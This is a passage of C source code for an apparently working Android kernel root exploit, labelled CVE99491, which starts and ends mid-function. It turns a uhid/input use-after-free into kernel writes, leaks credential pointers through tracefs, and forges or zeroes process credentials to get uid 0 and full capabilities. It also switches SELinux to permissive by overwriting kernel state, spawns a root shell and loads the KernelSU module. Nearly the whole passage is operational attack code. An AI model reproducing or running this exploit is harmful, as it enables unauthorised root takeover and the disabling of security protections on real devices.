        if (!win)
            abort_armed_and_park("cred writes did not land");
        printf("[+] child ids zeroed\n");

        /* caps: only cap_bset and cap_permitted need to be written.  At
         * exec, handle_privileged_root() recomputes pP' from cap_bset and
         * sets pE' = pP'; with cap_permitted already ~0 the __cap_gained()
         * downgrade branch is skipped.  A record at T writes the value at
         * T+4 and {type,code} at T, so the high half goes first and each
         * pair is verified from the child's status. */
        {
            unsigned long long bnd = 0;
            char probe[256] = "";
            struct {
                unsigned off;
                const char *key;
                int skip;
            } phases[2] = {
                { CR_CAPBSET, "bnd=", 0 },
                { CR_CAPPRM,  "prm=", 0 },
            };
            int caps_ok = 1;
            struct pchain cp = { .a = a, .base = base, .slide = slide,
                                 .started = 1 };

            if (write(go, "V", 1) == 1 &&
                read_line_timeout(st, probe, sizeof(probe), 3000) > 0) {
                char *pk = strstr(probe, "bnd=");

                bnd = pk ? strtoull(pk + 4, NULL, 16) : 0;
                printf("[*] caps initial: %s", probe);
            }
            phases[0].skip = bnd == CAP_FULL;
            for (size_t p = 0; p < sizeof(phases) / sizeof(phases[0]); p++) {
                int ok = 0;
                if (phases[p].skip) {
                    printf("[*] caps %s already full\n", phases[p].key);
                    continue;
                }
                for (int attempt = 0; attempt < 12 && !ok; attempt++) {
                    char line[256] = "";
                    char *pk;
                    unsigned long long v;

                    if (uchain_re(&cp, R + phases[p].off, EV_PWR, 0,
                                  (int)CAP_FULL_HI) < 0 ||
                        uchain_re(&cp, R + phases[p].off - 4, EV_PWR, 0,
                                  -1) < 0)
                        break;
                    if (write(go, "V", 1) != 1)
                        break;
                    if (read_line_timeout(st, line, sizeof(line), 3000) <= 0)
                        break;
                    pk = strstr(line, phases[p].key);
                    v = pk ? strtoull(pk + strlen(phases[p].key), NULL, 16)
                           : 0;
                    printf("[*] caps %s try %d: %s", phases[p].key,
                           attempt + 1, line);
                    if (v == CAP_FULL)
                        ok = 1;
                }
                printf("[%c] caps %s %s\n", ok ? '+' : '-', phases[p].key,
                       ok ? "verified" : "did not converge");
                if (!ok) {
                    caps_ok = 0;
                    break;
                }
            }
            printf("[%c] capability set %s\n", caps_ok ? '+' : '-',
                   caps_ok ? "complete" : "incomplete");
            if (!caps_ok)
                abort_armed_and_park("capability set incomplete");
        }

        printf("[+] elevating child to /system/bin/sh\n");
        (void)!write(go, "X", 1);
        {
            int status = 0;
            waitpid(child, &status, 0);
            printf("[+] child shell exited status=%#x\n", status);
        }
        {
            pid_t h = fork();
            if (h == 0)
                park_holder();
            printf("[+] armed holder pid %d\n", (int)h);
        }
    }
    return 0;
}

/*
 * no-tracefs mode [non-mainline] (internal label: no-tracefs-fakecred).
 * The real_cred read/forgery path, but only task->cred is swapped (no
 * real_cred equalize, no setcon) and the shell/KSU are delivered through
 * fork+exec.  The KSU loader measured a 5/5 clean-boot block.  After the
 * uinput trigger is armed every read/write is uinput-only; a miss is
 * retried and then parks instead of falling back to a blind pad report.
 */
static int run_no_tracefs_fakecred(struct anchor *a, unsigned long long base,
                                   unsigned long long slide,
                                   const struct exp_opts *o)
{
    struct pchain pa;
    unsigned char buf[4096];
    unsigned char prev[64];
    unsigned char icred[CVE99491_CRED_MAX];
    unsigned char name[32];
    unsigned long long p0 = base + UHID_OUTQ_OFF;
    unsigned long long offs[8] = { 0 };
    unsigned long long task = 0, idle = 0, fake;
    unsigned long long rqv, ic, sel;
    unsigned long long mark = 0x4d4b4a4cULL;
    int i, ok = 0;

    memset(&pa, 0, sizeof(pa));
    pa.a = a;
    pa.base = base;
    pa.slide = slide;
    pa.pad_fd = -1;
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    if (pin_cpu(o->cpu) != 0) {
        perror("sched_setaffinity");
        return 1;
    }
    if (spray_setup() < 0 || rd_page_setup() < 0)
        return 1;
    g_fire_cap = 64;
    g_oracle_disable = 1;
    g_no_pad_fallback = 1;
    /* Create the uinput trigger before the UAF: its input_dev/absinfo/
     * evdev allocations are kmalloc-2k and must not race the freed
     * touch slot. */
    if (uinput_trigger_open() < 0) {
        park_on_fail("uinput trigger open failed");
        return 1;
    }

    /* Record PARKED before the first fire in this mode. */
    (void)cve99491_parked_mark_in(g_run_dir);

    /* 1. Bootstrap pinned to the target CPU; no-tracefs never uses the
     * kmem oracle, only the synchronous teardown free. */
    if (pchain_first(&pa, p0, EV_PWR, (unsigned)((p0 >> 16) & 0xffff),
                     (int)(p0 >> 32), o->spray_n, o->spread_ms) < 0)
        abort_armed_and_park("bootstrap fire failed");
    for (i = 0; i < 4 && !ok; i++) {
        if (pc_write(&pa, base + UHID_HEAD_OFF, 0, (int)(p0 & 0xffffffff),
                     o->spray_n) < 0)
            break;
        if (outq_read(a, buf, 4096) != 0)
            continue;
        ok = *(unsigned long long *)buf == p0;
    }
    if (!ok)
        abort_armed_and_park("self cell install failed");
    memcpy(prev, buf, sizeof(prev));
    g_spread_ms = 0;
    printf("[+] self cell %#llx\n", p0);
    PLOG("self cell installed\n");

    /* 2. Arm the uinput trigger (no tracefs needed: the walk uses short
     * pad reads and the grab is verified by a short pad read).  From here
     * every write must use uinput; a missed arm parks instead of falling
     * back to a blind pad report. */
    if (g_uin_fd >= 0 && uchain_setup(&pa, slide, o->spray_n) == 0) {
        g_uchain = 1;
    } else {
        abort_armed_and_park("uinput trigger unavailable");
    }

    /* 3. __per_cpu_offset[]. */
    if (read_static(&pa, SYM_PER_CPU_OFFSET + slide, prev, buf, 64,
                    o->spray_n) < 0)
        abort_armed_and_park("__per_cpu_offset read failed");
    for (i = 0; i < 8; i++)
        offs[i] = *(unsigned long long *)(buf + 8 * i);
    memcpy(prev, buf, sizeof(prev));
    if (!is_kptr(SYM_RUNQUEUES + slide + offs[0]))
        abort_armed_and_park("per-cpu offsets invalid");
    printf("[+] cpu%d runqueue %#llx\n", o->cpu,
           SYM_RUNQUEUES + slide + offs[o->cpu]);

    /* 4. init_cred: template for the forgery. */
    ic = INIT_CRED_ADDR + slide;
    if (read_static(&pa, ic, prev, buf, CRED_SIZE, o->spray_n) < 0)
        abort_armed_and_park("init_cred read failed");
    memcpy(prev, buf, sizeof(prev));
    memcpy(icred, buf, CRED_SIZE);
    if (*(uint32_t *)(icred + CR_UID) != 0 ||
        !is_kptr(*(unsigned long long *)(icred + CR_SECURITY)) ||
        !is_kptr(*(unsigned long long *)(icred + CR_USER)) ||
        !is_kptr(*(unsigned long long *)(icred + CR_USER_NS)))
        abort_armed_and_park("init_cred content unexpected");
    printf("[+] init_cred security=%#llx user=%#llx ns=%#llx cap=%#llx\n",
           *(unsigned long long *)(icred + CR_SECURITY),
           *(unsigned long long *)(icred + CR_USER),
           *(unsigned long long *)(icred + CR_USER_NS),
           *(unsigned long long *)(icred + CR_CAP_EFF));

    /* 5. Current task from rq->curr of the pinned CPU. */
    {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(o->cpu, &set);
        sched_setaffinity(0, sizeof(set), &set);
    }
    rqv = SYM_RUNQUEUES + slide + offs[o->cpu];
    ok = 0;
    for (i = 0; i < 3 && !ok; i++) {
        if (read_static(&pa, rqv + RQ_OFF_CURR, prev, buf, 32,
                        o->spray_n) < 0)
            continue;
        task = *(unsigned long long *)buf;
        idle = *(unsigned long long *)(buf + RQ_OFF_IDLE - RQ_OFF_CURR);
        if (is_kptr(task) && task != idle) {
            memcpy(prev, buf, sizeof(prev));
            ok = 1;
        }
    }
    if (!ok)
        abort_armed_and_park("rq->curr read failed");
    printf("[+] task %#llx (idle %#llx)\n", task, idle);
    PLOG("task=%#llx idle=%#llx\n", task, idle);

    /* 6. SELinux off: eight zero bytes clear enforcing/initialized.  If
     * selinuxfs is unreadable, verify the state bytes directly. */
    sel = SYM_SELINUX_STATE + slide + SEL_ENF_OFF;
    ok = 0;
    for (i = 0; i < 4 && !ok; i++) {
        int ef;

        printf("[step] permissive try %d\n", i + 1);
        if (nt_write(&pa, sel, EV_ABS, 0, 0) < 0 ||
            nt_write(&pa, sel + 4, EV_ABS, 0, 0) < 0)
            abort_armed_and_park("selinux uinput write failed");
        usleep(1000);
        ef = selinux_enforce_now();
        if (ef == 0) {
            ok = 1;
        } else if (ef < 0) {
            unsigned char t[8];
            if (read_static(&pa, sel, prev, t, 8, o->spray_n) == 0) {
                memcpy(prev, t, sizeof(t));
                if ((*(unsigned long long *)t & 0xffffffffULL) == 0)
                    ok = 1;
            }
        }
        PLOG("selinux try %d enforce=%d\n", i + 1, ef);
    }
    if (!ok)
        restore_enforcing_and_park("selinux_state write did not land");
    printf("[+] SELinux permissive\n");
    PLOG("selinux off\n");

    /* 7. Task identity through the comm marker. */
    {
        int marked = 0;

        memset(name, 0, sizeof(name));
        if (prctl(PR_GET_NAME, name, 0, 0, 0) != 0)
            abort_armed_and_park("cannot read own comm");
        if (name[0] == 0x16)
            abort_armed_and_park("comm already carries the marker");
        for (i = 0; i < 4 && !marked; i++) {
            memset(name, 0, sizeof(name));
            if (nt_write(&pa, task + TS_OFF_COMM, EV_PWR,
                         (unsigned)(mark & 0xffff),
                         (int)(mark >> 16)) < 0)
                abort_armed_and_park("comm uinput write failed");
            usleep(1000);
            if (prctl(PR_GET_NAME, name, 0, 0, 0) != 0)
                continue;
            printf("[*] comm probe %d: %02x %02x %02x %02x\n", i + 1,
                   name[0], name[1], name[2], name[3]);
            if (name[0] == 0x16 && name[1] == 0x00)
                marked = 1;
        }
        if (!marked) {
            abort_armed_and_park("comm marker did not land; "
                                 "task pointer unverified");
        }
    }
    printf("[+] task pointer verified through comm\n");
    PLOG("task verified\n");

    /* 8. Forge the cred inside the anchor input_buf. */
    {
        unsigned long long usage = 0x70000000ULL;
        memcpy(g_cred_blob, icred, CRED_SIZE);
        memcpy(g_cred_blob, &usage, 8);
        memset(g_cred_blob + CR_RCU_OFF, 0, CR_RCU_SIZE);
        g_cred_blob_on = 1;
    }
    fake = base + UHID_DATA_OFF + C_OFF_FAKE;
    printf("[+] forged cred %#llx (usage 0x70000000)\n", fake);
    PLOG("fake cred=%#llx\n", fake);

    /* 9. Swap task->cred. */
    ok = 0;
    for (i = 0; i < 5 && !ok; i++) {
        if (nt_write(&pa, task + TS_OFF_CRED - 2, EV_PWR,
                     (unsigned)(fake & 0xffff),
                     (int)((fake >> 16) & 0xffffffff)) < 0)
            abort_armed_and_park("cred swap uinput write failed");
        usleep(1000);
        printf("[*] swap %d: uid=%u gid=%u\n", i + 1,
               (unsigned)getuid(), (unsigned)getgid());
        PLOG("swap %d uid=%u gid=%u\n", i + 1, (unsigned)getuid(),
             (unsigned)getgid());
        if (getuid() == 0 && getgid() == 0)
            ok = 1;
    }
    if (!ok)
        abort_armed_and_park("cred swap did not land");

    /* 10. Restore real_cred[6..7] = 0xffff. */
    {
        int val = (int)((((unsigned long long)fake & 0xffff) << 16) |
                        0xffff);
        for (i = 0; i < 3; i++) {
            if (nt_write(&pa, task + TS_OFF_REAL_CRED + 6, EV_ABS, 0,
                         val) < 0)
                abort_armed_and_park("real_cred repair uinput write failed");
        }
    }

    /* 11. Armed holder. */
    printf("[+] spawning uid-0 shell\n");
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    {
        pid_t h = fork();
        if (h == 0)
            park_holder();
    }


    {
        pid_t c = fork();
        if (c == 0) {
            /* copy_creds() gave this task cred == real_cred, so the commit
             * path is safe here and settles the setuid(0) acceptance step
             * on a normal committed cred. */
            (void)setgid(0);
            (void)setuid(0);
            char shcmd[512];

            snprintf(shcmd, sizeof(shcmd),
                     "{ id; echo ---; getenforce; echo ---; "
                     "grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd):' "
                     "/proc/self/status; } 2>&1 | tee %s", g_run_out);
            execl("/system/bin/sh", "sh", "-c", shcmd, (char *)NULL);
            fprintf(stderr, "[-] exec sh failed: %s\n", strerror(errno));
            _exit(2);
        }
        if (c < 0)
            abort_armed_and_park("shell fork failed");
        printf("[+] shell pid %d\n", (int)c);
    }
    park_holder();
}

/*
 * ==========================================================================
 * DIRECT fixed-word engine (CVE99491_ENGINE=direct; XRING/5.15 style)
 *
 * The Yunnijian fake-handle chain is not used here: every write is one fresh
 * 99491 UAF whose reclaimed skb is a fake input_dev with a direct `vals`
 * pointer, so the pad MUTE report makes the kernel append one fixed 8-byte
 * input_value word at `vals`:
 *   DIRECT_WORD_V1   {EV_SW, SW_MUTE_DEVICE, 1} = 05 00 0e 00 01 00 00 00
 *   DIRECT_WORD_ZERO evbit=EV_SW|EV_SYN, swbit=0: the switch event is
 *                    dropped, input_sync() appends the 8-byte zero word
 * evbit must never carry EV_SYN for the switch word (h_list is spray data);
 * the zero word path is the only one that sets it.  Each write rebuilds the
 * UAF pair and drains the sockets (XRING pitfalls 1.1-1.3).
 * ==========================================================================
 */
#define DIRECT_WORD_V1   2
#define DIRECT_WORD_ZERO 1

static void build_direct_payload(unsigned char *buf, size_t len,
                                 unsigned long long vals_target, int mode) {
    unsigned long long evbit = (mode == DIRECT_WORD_ZERO) ? 0x21ULL : 0x20ULL;
    unsigned long long swbit = (mode == DIRECT_WORD_ZERO) ? 0ULL : (1ULL << 14);
    unsigned int num_vals = 0;
    unsigned int max_vals = 0x1000; /* never flush (no h_list/grab deref) */
    unsigned int inhibited = 0;

    /* sw state (input_dev+0x1c0) stays zero: the V1 word relies on a 0 -> 1
     * state change, so the switch event is not filtered out. */
    memset(buf, 0, len);
    memcpy(buf + IDEV_EVBIT_OFF, &evbit, 8);
    memcpy(buf + IDEV_SWBIT_OFF, &swbit, 8);
    memcpy(buf + IDEV_NUM_VALS_OFF, &num_vals, 4);
    memcpy(buf + IDEV_MAX_VALS_OFF, &max_vals, 4);
    memcpy(buf + IDEV_VALS_OFF, &vals_target, 8);
    memcpy(buf + IDEV_INHIBITED_OFF, &inhibited, 4);
}

/* Per-call scratch fd for the direct pair. */
static int direct_pair_fds[2];

static void direct_pair_reset(void) {
    direct_pair_fds[0] = direct_pair_fds[1] = -1;
}

/*
 * One fixed-word write: fresh touch+pad UAF pair, pad trigger, teardown.
 * `mode` selects the word (DIRECT_WORD_V1 / DIRECT_WORD_ZERO).  Returns 0
 * when the UAF trigger sequence completed (the word landing is verified by
 * the caller through the child side, e.g. euid/caps probes).
 */
static int direct_uaf_write(unsigned long long target, int mode, long spray_n,
                            long spread_ms) {
    int fd_t = -1, fd_p = -1, evfd = -1;
    char old[MAXEV][16], node[32] = "", nm[64] = "";
    struct evdev_close_watch ecw = { .fd = -1, .wd = -1 };
    unsigned char *sp = malloc(g_prof.spray_len);
    int nold = list_events(old);
    int rc = -1;

    direct_pair_reset();
    if (!sp)
        return -1;
    fd_t = uhid_open();
    if (fd_t < 0)
        goto out;
    direct_pair_fds[0] = fd_t;
    if (uhid_create(fd_t, NAME_TOUCH, PHYS_COMMON, 0x1101, rdesc_touch,
                    sizeof(rdesc_touch)) < 0)
        goto out;
    pump_until_start(fd_t, now_ms() + 2000);
    usleep(120000);
    if (find_touch_node(old, nold, node, sizeof(node), nm, sizeof(nm)) < 0)
        goto out;
    evfd = open(node, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (evfd < 0)
        goto out;
    (void)evdev_watch_open(&ecw, node);
    fd_p = uhid_open();
    if (fd_p < 0)
        goto out;
    direct_pair_fds[1] = fd_p;
    if (uhid_create(fd_p, NAME_PAD, PHYS_COMMON, 0x1102, rdesc_pad,
                    sizeof(rdesc_pad)) < 0)
        goto out;
    pump_until_start(fd_p, now_ms() + 2000);
    usleep(120000);

    build_direct_payload(sp, g_prof.spray_len, target, mode);
    /* Teardown touch, wait until InputReader dropped its evdev fd, then free
     * the input_dev with our own close() on the pinned CPU and reclaim. */
    uhid_destroy(fd_t);
    close(fd_t);
    fd_t = -1;
    if (ecw.fd >= 0) {
        (void)evdev_watch_wait(&ecw, (long)g_prof.spray_hold_wait_ms, NULL);
        evdev_watch_close(&ecw);
    } else {
        long w = (long)g_prof.spray_hold_wait_ms;

        if (w > 0)
            usleep((useconds_t)w * 1000);
    }
    if (g_prof.spray_fill > 0)
        (void)spray_local((long)g_prof.spray_fill, sp);
    if (evfd >= 0) {
        close(evfd); /* last evdev ref: kfree on this CPU */
        evfd = -1;
    }
    usleep(1000);
    (void)spray_local((long)g_prof.spray_burst_step, sp);
    if (spray_spread(spray_n, spread_ms, sp) < 0)
        goto out;
    usleep(10000);
    {
        unsigned char rep[2];

        rep[0] = 0x02;
        /* {02 02} -> SW_MUTE value 1 (V1 word); {02 03} -> value 0 (the
         * zero-word path drops EV_SW anyway). */
        rep[1] = (mode == DIRECT_WORD_V1) ? 0x02 : 0x03;
        (void)uhid_input_raw(fd_p, rep, sizeof(rep));
    }
    usleep(150000);
    rc = 0;
out:
    if (evfd >= 0)
        close(evfd);
    evdev_watch_close(&ecw);
    if (fd_p >= 0) {
        uhid_destroy(fd_p);
        close(fd_p);
        fd_p = -1;
    }
    if (fd_t >= 0) {
        uhid_destroy(fd_t);
        close(fd_t);
    }
    free(sp);
    spray_drain();
    direct_pair_reset();
    return rc;
}

/*
 * 6.18 tracefs cred leak: fork a child that re-execs this binary in `wait`
 * mode, enable kmem_cache_alloc through the world-writable rss_stat trigger,
 * let the child exec allocate its private cred, and scan the per-CPU raw ring
 * for the cred_jar allocation (bytes_req=0xb8, call site low21 from profile).
 * Returns the cred pointer and hands back the child pid/pipe fds.
 */
static unsigned long long direct_cred_leak(const struct exp_opts *o,
                                           pid_t *child_out, int *go_out,
                                           int *st_out) {
    unsigned char *raw = NULL;
    unsigned long long R = 0;
    uint32_t hello = 0;
    long n = 0;
    int go = -1, st = -1;
    pid_t child;

    if (trace_prepare() != 0) {
        fprintf(stderr, "[-] trace prepare failed\n");
        return 0;
    }
    child = spawn_wait_child(o->cpu, &go, &st);
    if (child < 0) {
        fprintf(stderr, "[-] fork failed\n");
        trace_probe_event_enable(0);
        return 0;
    }
    trace_wr(TR_PATH "/tracing_on", "1");
    (void)!write(go, "A", 1);
    {
        /* 等子进程 exec 完成并写出 CHILD_HELLO；只有 hello 到达才说明
         * cred 已经分配，此时再关 tracing。（固定 60ms sleep 在冷启动时
         * 可能偏短，导致 ring 里没有 cred 分配记录。） */
        struct pollfd pfd = { .fd = st, .events = POLLIN };
        long waited = 0;
        uint32_t got = 0;
        int early_checked = 0;

        while (waited < 3000 && hello != CHILD_HELLO) {
            int pr = poll(&pfd, 1, 50);

            if (pr > 0 && (pfd.revents & POLLIN)) {
                if (read_full(st, &got, sizeof(got)) == 0)
                    hello = got;
                break;
            }
            if (pr < 0 && errno != EINTR)
                break;
            waited += 50;
            if (!early_checked && waited >= 500) {
                int status = 0;
                pid_t w = waitpid(child, &status, WNOHANG);

                early_checked = 1;
                if (w == child)
                    fprintf(stderr,
                            "[-] child exited before hello: status=%#x\n",
                            status);
            }
        }
        if (hello != CHILD_HELLO) {
            int status = 0;
            pid_t w = waitpid(child, &status, WNOHANG);

            fprintf(stderr, "[-] child hello timeout: hello=%#x waitpid=%d "
                    "status=%#x errno=%d\n", hello, (int)w, status, errno);
        }
    }
    usleep(10000);
    trace_wr(TR_PATH "/tracing_on", "0");
    raw = malloc(TRACE_BUF_BYTES);
    if (raw) {
        n = trace_read_cpu(o->cpu, raw, TRACE_BUF_BYTES);
        if (n > 0) {
            if (getenv("CVE99491_CREDLEAK_DEBUG"))
                trace_dump_cred_recs(raw, (size_t)n, (int)child);
            R = trace_cred_ptr(raw, n, (int)child);
        } else {
            fprintf(stderr, "[dbg] credleak raw ring empty n=%ld (cpu=%d)\n",
                    n, o->cpu);
        }
        free(raw);
    }
    trace_probe_event_enable(0);
    if (R && hello == CHILD_HELLO) {
        printf("[+] cred leak: child=%d cred=%#llx (%ld bytes)\n", (int)child,
               R, n);
        *child_out = child;
        *go_out = go;
        *st_out = st;
        return R;
    }
    printf("[-] cred leak failed R=%#llx hello=%#x\n", R, hello);
    if (child > 0) {
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
    }
    if (go >= 0)
        close(go);
    if (st >= 0)
        close(st);
    return 0;
}

static int direct_child_probe_ids(pid_t child, int go, int st, uint32_t ids[4]) {
    (void)child;
    if (write(go, "p", 1) != 1)
        return -1;
    return read_full(st, ids, sizeof(uint32_t) * 4);
}

static int direct_child_probe_line(pid_t child, int go, int st, char *line,
                                   size_t cap) {
    (void)child;
    if (write(go, "V", 1) != 1)
        return -1;
    return read_line_timeout(st, line, cap, 3000);
}

static int direct_child_probe_fsuid(pid_t child, int go, int st,
                                    unsigned int *out) {
    (void)child;
    if (write(go, "F", 1) != 1)
        return -1;
    return read_full(st, out, sizeof(*out));
}

/* euid oracle: V1 word at cred+0x12 -> sgid crossed, euid(+0x18) = 0. */
static int direct_euid_oracle(pid_t child, int go, int st,
                              unsigned long long R, const struct exp_opts *o,
                              int *writes) {
    for (int t = 0; t < 4; t++) {
        uint32_t ids[4] = { ~0u, ~0u, ~0u, ~0u };

        if (direct_uaf_write(R + 0x12, DIRECT_WORD_V1, o->spray_n,
                             o->spread_ms) < 0)
            return -1;
        (*writes)++;
        if (direct_child_probe_ids(child, go, st, ids) < 0)
            return -1;
        printf("[*] euid try %d: uid=%u euid=%u gid=%u egid=%u\n", t + 1,
               ids[0], ids[1], ids[2], ids[3]);
        if (ids[1] == 0)
            return 0;
    }
    return -1;
}

static void direct_child_kill(pid_t *child, int *go, int *st) {
    if (*child > 0) {
        kill(*child, SIGKILL);
        waitpid(*child, NULL, 0);
        *child = -1;
    }
    if (*go >= 0) {
        close(*go);
        *go = -1;
    }
    if (*st >= 0) {
        close(*st);
        *st = -1;
    }
}

/*
 * --stage=cred: tracefs cred leak + euid oracle only.  This modifies only the
 * forked child's private cred (child is killed on exit); the UAF writes still
 * dirty this boot, so the PARKED marker is set once up front and the caller
 * must reboot before another fire run.
 */
static int run_direct_cred(const struct exp_opts *o) {
    unsigned long long R = 0;
    pid_t child = -1;
    int go = -1, st = -1;
    int writes = 0, ok = 0;

    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    if (pin_cpu(o->cpu) != 0) {
        perror("sched_setaffinity");
        return 1;
    }
    (void)cve99491_parked_mark_in(g_run_dir);
    printf("[!] direct engine: PARKED marker set for this boot; reboot before "
           "the next fire run\n");
    if (spray_setup() < 0) {
        printf("[-] spray setup failed\n");
        return 1;
    }
    for (int round = 0; round < 3 && !ok; round++) {
        R = direct_cred_leak(o, &child, &go, &st);
        if (!R)
            continue;
        if (getenv("CVE99491_CRED_LEAK_ONLY") != NULL) {
            printf("[+] cred leak candidate=%#llx (leak-only, no UAF write)\n",
                   R);
            printf("CRED_LEAK_ONLY_OK\n");
            direct_child_kill(&child, &go, &st);
            spray_drain();
            return 0;
        }
        if (direct_euid_oracle(child, go, st, R, o, &writes) == 0)
            ok = 1;
        else
            direct_child_kill(&child, &go, &st);
    }
    if (ok) {
        printf("[+] cred cand=%#llx euid=0 (uaf_writes=%d)\n", R, writes);
        printf("CRED_ORACLE_OK\n");
        direct_child_kill(&child, &go, &st);
        spray_drain();
        printf("[!] direct engine complete: reboot required (PARKED marker "
               "set)\n");
        return 0;
    }
    printf("[-] cred oracle failed after %d UAF writes\n", writes);
    printf("PARKED\n");
    direct_child_kill(&child, &go, &st);
    return 1;
}

static int direct_read_module_live(void) {
    FILE *f = fopen("/proc/modules", "r");
    char line[512];
    int live = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f))
        if (!strncmp(line, "kernelsu ", 9) && strstr(line, "Live")) {
            live = 1;
            break;
        }
    fclose(f);
    return live;
}

/* kprobe is unavailable on this ROM; the direct endgame resolves ksud via the
 * profile/env and lets the already-elevated child exec `late-load` in place. */
static int direct_resolve_ksud(void) {
    const char *env = getenv("CVE99491_KSU_LIB");

    ksu_derive_kmi();
    if (env && *env && access(env, X_OK) == 0) {
        snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", env);
    } else if (ksu_locate_ksud() != 0) {
        static const char *paths[] = {
            "/data/local/tmp/ksud", "/data/adb/ksud",
        };
        g_ksud_lib[0] = 0;
        for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++)
            if (access(paths[i], X_OK) == 0) {
                snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", paths[i]);
                break;
            }
    }
    if (!g_ksud_lib[0])
        return -1;
    setenv("CVE99491_KSU_LIB", g_ksud_lib, 1);
    printf("[*] ksud=%s kmi=%s\n", g_ksud_lib, g_ksud_kmi);
    return 0;
}

/* permissive window fallback: V1 word at selinux_state-1 leaves enforcing=0
 * (byte1 of 05 00 0e 00 ...); restore writes the same word at
 * selinux_state-2 so enforcing becomes 0x0e (non-zero).  This avoids the
 * 8-byte stock-chain clear but still pokes one byte before selinux_state --
 * the documented trade-off while the AVC-node way is not calibrated yet. */
static int direct_enforce_window(unsigned long long sel, const struct exp_opts *o,
                                 int open_window) {
    long spray_n = o->spray_n, spread_ms = o->spread_ms;
    unsigned long long target = open_window ? sel - 1 : sel - 2;
    int want = open_window ? 0 : 1;

    for (int t = 0; t < 4; t++) {
        if (direct_uaf_write(target, DIRECT_WORD_V1, spray_n, spread_ms) < 0)
            return -1;
        usleep(20000);
        if (selinux_enforce_now() == want)
            return 0;
    }
    return -1;
}

/*
 * --stage=root: cred+caps+permissive(+ksud late-load unless --no-ksu).
 * Builds on the same leak/oracle helpers as --stage=cred.
 */
static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
    unsigned long long R = 0, sel;
    pid_t child = -1;
    int go = -1, st = -1, writes = 0, caps_ok = 0, fsuid_ok = 0;
    int window = 0, live = 0;
    int status = 0;

    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    if (pin_cpu(o->cpu) != 0) {
        perror("sched_setaffinity");
        return 1;
    }
    (void)cve99491_parked_mark_in(g_run_dir);
    printf("[!] direct engine: PARKED marker set for this boot; reboot before "
           "the next fire run\n");
    if (spray_setup() < 0)
        return 1;

    for (int round = 0; round < 3 && !R; round++) {
        R = direct_cred_leak(o, &child, &go, &st);
        if (R && direct_euid_oracle(child, go, st, R, o, &writes) != 0) {
            direct_child_kill(&child, &go, &st);
            R = 0;
        }
    }
    if (!R) {
        printf("[-] direct root: no euid-0 candidate\n");
        printf("PARKED\n");
        return 1;
    }
    printf("[+] cred cand=%#llx euid=0 (uaf_writes=%d)\n", R, writes);

    /* fsuid/fsgid: zero word at cred+0x20 (SYN_REPORT vector) */
    for (int t = 0; t < 4 && !fsuid_ok; t++) {
        unsigned int fs = ~0u;

        /* real uid/gid 与 suid/sgid 也清零：ksud late-load 与应用侧
         * `su -c` 都以 real uid 判断，只有 euid=0 不够。 */
        if (direct_uaf_write(R + 0x08, DIRECT_WORD_ZERO, o->spray_n,
                             o->spread_ms) < 0)
            goto fail;
        writes++;
        if (direct_uaf_write(R + 0x10, DIRECT_WORD_ZERO, o->spray_n,
                             o->spread_ms) < 0)
            goto fail;
        writes++;
        if (direct_uaf_write(R + 0x20, DIRECT_WORD_ZERO, o->spray_n,
                             o->spread_ms) < 0)
            break;
        writes++;
        {
            uint32_t ids[4] = { ~0u, ~0u, ~0u, ~0u };
            int ids0 = direct_child_probe_ids(child, go, st, ids) == 0;

            if (direct_child_probe_fsuid(child, go, st, &fs) == 0 &&
                fs == 0 && ids0 && ids[0] == 0 && ids[1] == 0 &&
                ids[2] == 0 && ids[3] == 0) {
                fsuid_ok = 1;
                printf("[*] ids: uid=%u euid=%u gid=%u egid=%u\n",
                       ids[0], ids[1], ids[2], ids[3]);
            } else {
                printf("[*] ids try %d: uid=%u euid=%u gid=%u egid=%u "
                       "fsuid=%u\n", t + 1, ids[0], ids[1], ids[2], ids[3],
                       fs);
            }
        }
    }
    printf("[%c] fsuid=0\n", fsuid_ok ? '+' : '-');
    if (!fsuid_ok)
        goto fail;

    /* CAP_SYS_MODULE via V1 word at cred+0x3e -> cap_effective bit16 */
    for (int t = 0; t < 8 && !caps_ok; t++) {
        char line[256] = "";
        unsigned long long eff = 0;
        char *p;

        if (direct_uaf_write(R + 0x3e, DIRECT_WORD_V1, o->spray_n,
                             o->spread_ms) < 0)
            break;
        writes++;
        if (direct_child_probe_line(child, go, st, line, sizeof(line)) <= 0)
            continue;
        p = strstr(line, "eff=");
        eff = p ? strtoull(p + 4, NULL, 16) : 0;
        printf("[*] caps try %d: %s", t + 1, line);
        if (eff & (1ULL << 16))
            caps_ok = 1;
    }
    printf("[%c] caps bit16(CAP_SYS_MODULE)\n", caps_ok ? '+' : '-');
    if (!caps_ok)
        goto fail;

    /* permissive window */
    sel = SYM_SELINUX_STATE + slide + SEL_ENF_OFF;
    if (selinux_enforce_now() == 0)
        window = 1;
    else if (direct_enforce_window(sel, o, 1) == 0) {
        window = 1;
        writes++;
    }
    if (!window) {
        printf("[-] direct root: permissive window failed\n");
        goto fail;
    }
    printf("[!] permissive window opened at selinux_state-1 (fallback path; "
           "one byte before selinux_state is touched)\n");

    if (g_no_ksu) {
        (void)direct_enforce_window(sel, o, 0);
        printf("[+] direct root: creds+caps done; --no-ksu stops before module "
               "(enforce=%d)\n", selinux_enforce_now());
        goto done;
    }

    if (direct_resolve_ksud() != 0) {
        printf("[-] direct root: no ksud loader found (use --ksud PATH or "
               "CVE99491_KSU_LIB)\n");
        goto fail;
    }
    setenv("CVE99491_KSU_CLI", g_ksud_lib, 1);
    setenv("CVE99491_KMI", g_ksud_kmi, 1);
    printf("[step] direct root: exec late-load in the elevated child "
           "(cli=%s kmi=%s)\n", g_ksud_lib, g_ksud_kmi);
    /* The uid-0 child cannot use KSU's sucompat read path; leave the su
